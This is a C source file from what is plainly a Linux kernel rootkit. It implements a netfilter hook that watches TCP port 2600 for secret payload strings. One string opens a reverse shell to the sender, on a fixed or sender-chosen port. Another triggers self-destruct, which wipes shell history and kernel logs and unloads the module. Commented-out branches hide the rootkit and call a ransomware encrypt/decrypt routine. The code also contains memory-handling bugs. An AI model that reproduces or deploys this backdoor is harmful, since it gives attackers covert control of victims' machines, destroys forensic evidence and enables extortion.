#include "h_netfilter.h"
#include "../revshell.h"
#include "../selfdestruct.h"
#include "h_kill.h"


const char* BACKDOOR_KEY_2600 = "2600_PAYLOAD_GET_REVERSE_SHELL";
const char* BACKDOOR_KEY_2600_CUSTOM = "CUSTOM_2600_PAYLOAD_GET_REVERSE_SHELL_";
const char* HIDE_ROOTKIT_KEY_2600 = "2600_HIDE_ROOTKIT";
const char* SHOW_ROOTKIT_KEY_2600 = "2600_SHOW_ROOTKIT";
const char* DESTRUCT = "2600_KILL_ALL";

// const char* ENCRYPT_DIR_KEY_2600 = "2600_ENCRYPT_DIR";
// #define ENCRYPT_DIR_KEY_BUF_LEN_2600 512
// const char* DECRYPT_DIR_KEY_2600 = "2600_DECRYPT_DIR";
// #define DECRYPT_DIR_KEY_BUF_LEN_2600 512



/**
 * Inspects incoming packets and check correspondence to backdoor packet:
 *      Proto: TCP
 *      Port: 2600
 *      Payload: 2600_PAYLOAD_GET_REVERSE_SHELL (or any other payload of above)
 */ 
unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
    //Network headers
    struct iphdr *ip_header;        //ip header
    struct tcphdr *tcp_header;      //tcp header
    struct sk_buff *sock_buff = skb;//sock buffer
    char *user_data;       //data header pointer
    //Auxiliar
    int size;                       //payload size
    char* _data;
    struct tcphdr _tcphdr;
    struct iphdr _iph;
    char ip_source[16];
    //char port[16];

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }
    
    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
    //ip_header = (struct iphdr *)skb_network_header(sock_buff);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: TCP
    if(ip_header->protocol==IPPROTO_TCP){ 
        unsigned int dport;
        unsigned int sport;

        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);
        //tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);

        sport = htons((unsigned short int) tcp_header->source);
        dport = htons((unsigned short int) tcp_header->dest);
        //m_printd(KERN_INFO ":: Received packet on port %u\n", dport);
        if(dport != 2600){
            return NF_ACCEPT; //We ignore those not for port 2600
        }
        m_printd(KERN_INFO ":: Received packet on port 2600\n");
             

        //size = htons(ip_header->tot_len) - ip_header->ihl*4 - tcp_header->doff*4;
        size = htons(ip_header->tot_len) - sizeof(_iph) - tcp_header->doff*4;
        _data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;
        _data = kmalloc(size, GFP_KERNEL);
        user_data = skb_header_pointer(skb, ip_header->ihl*4 + tcp_header->doff*4, size, &_data);
        if(!user_data){
            m_printd(KERN_INFO "NULL INFO");
            kfree(_data);
            return NF_ACCEPT;
        }
        
        /*m_printd(KERN_INFO "IP offest %i\n", ip_header->ihl*4);
        m_printd(KERN_INFO "tcp offest %i\n", tcp_header->doff*4);
       
        m_printd(KERN_INFO "Total length %i\n", htons(ip_header->tot_len));
        m_printd(KERN_INFO "Size of payload %i\n", size);
        */

        m_printd(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
        m_printd(KERN_DEBUG "%s\n", user_data);

        if(strlen(user_data)<10){
            return NF_ACCEPT;
        }
        
        if(memcmp(user_data, BACKDOOR_KEY_2600, strlen(BACKDOOR_KEY_2600))==0){
            /****BACKDOOR KEY - Open a shell***/

            //Packet had the secret payload.
            m_printd(KERN_INFO ":: Received backdoor packet \n");
            //kfree(_data);
            
            //TODO Use a port specified in malicious packet to spawn shell. Right now always 5888
            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
            /*sprintf(port, "%d", sport);*/
            m_printd(KERN_INFO ":: Shell connecting to %s:%s \n", ip_source, REVERSE_SHELL_PORT);

            start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
            //TODO: Hide the backdoor packet to the local system
            return NF_DROP;
        }else if (strlen(user_data) == strlen(BACKDOOR_KEY_2600_CUSTOM)+ 4){
            /****BACKDOOR KEY - Open a shell with custom port***/
            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
            char last_four[5];  // +1 pour le caractère nul
            strncpy(last_four, user_data + strlen(user_data) - 4, 4); // get port 
            last_four[4] = '\0';
            printk(KERN_INFO ":: Shell custom port connecting to %s:%s \n", ip_source, last_four);
            start_reverse_shell(ip_source, last_four);
            return NF_DROP;
        }else if(memcmp(user_data, DESTRUCT, strlen(DESTRUCT))==0){
            /****SELFTDESTRUCT - No trace left***/
            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
            module_show();
            kboom();
            kboom_persistence();
            flush_history();
            flush_dmesg();
            unload();
            printk(KERN_INFO ":: CALL SELFDESTRUCT WITH TCP FROM %s \n", ip_source);
            return NF_DROP;
        }
        // }else if(memcmp(user_data, 2600_HIDE_ROOTKIT_KEY, strlen(2600_HIDE_ROOTKIT_KEY))==0){
        //     /****HIDE ROOTKIT KEY - Hide the rootkit, remotely***/

        //     printk(KERN_INFO ":: Received order to hide the rootkit \n");
        //     hide_rootkit();
        //     return NF_DROP;

        // }else if(memcmp(user_data, 2600_SHOW_ROOTKIT_KEY, strlen(2600_SHOW_ROOTKIT_KEY))==0){
        //     /****SHOW ROOTKIT KEY - Show the rootkit, remotely***/

        //     printk(KERN_INFO ":: Received order to unhide the rookit \n");
        //     show_rootkit();
        //     return NF_DROP;
        // }else if(memcmp(user_data, 2600_ENCRYPT_DIR_KEY, strlen(2600_ENCRYPT_DIR_KEY))==0){
        //     //Now we take out the directory which should come in user_data
        //     char encrypt_path[2600_ENCRYPT_DIR_KEY_BUF_LEN];
        //     strcpy(encrypt_path, user_data+strlen(2600_ENCRYPT_DIR_KEY));
        //     printk(KERN_INFO ":: Received order to ENCRYPT %s \n", encrypt_path);
        //     start_ransom_module(RANSOM_ENCRYPT, encrypt_path);
        //     return NF_DROP;
        // }else if(memcmp(user_data, 2600_DECRYPT_DIR_KEY, strlen(2600_DECRYPT_DIR_KEY))==0){
        //     char decrypt_path[2600_DECRYPT_DIR_KEY_BUF_LEN];
        //     strcpy(decrypt_path, user_data+strlen(2600_DECRYPT_DIR_KEY));
        //     printk(KERN_INFO ":: Received order to DECRYPT %s \n", decrypt_path);
        //     start_ransom_module(RANSOM_DECRYPT, decrypt_path);
        //     return NF_DROP;
        // }


        return NF_ACCEPT;

    }
    return NF_ACCEPT;

}

static struct nf_hook_ops nfho;

/**
 * Registers predefined nf_hook_ops
 */ 
int register_netfilter_hook(void){
    int err;
    
    nfho.hook = net_hook;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&init_net, &nfho);
    #else
        err = nf_register_hook(&nfho);
    #endif
    if(err<0){
        m_printd(KERN_INFO ":: Error registering nf hook");
    }else{
        m_printd(KERN_INFO ":: Registered nethook");
    }
    
    return err;
}

/**
 * Unregisters predefined nf_hook_ops
 */ 
void unregister_netfilter_hook(void){
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        nf_unregister_net_hook(&init_net, &nfho);
    #else
        nf_unregister_hook(&nfho);
    #endif
    m_printd(KERN_INFO ":: Unregistered nethook");

}
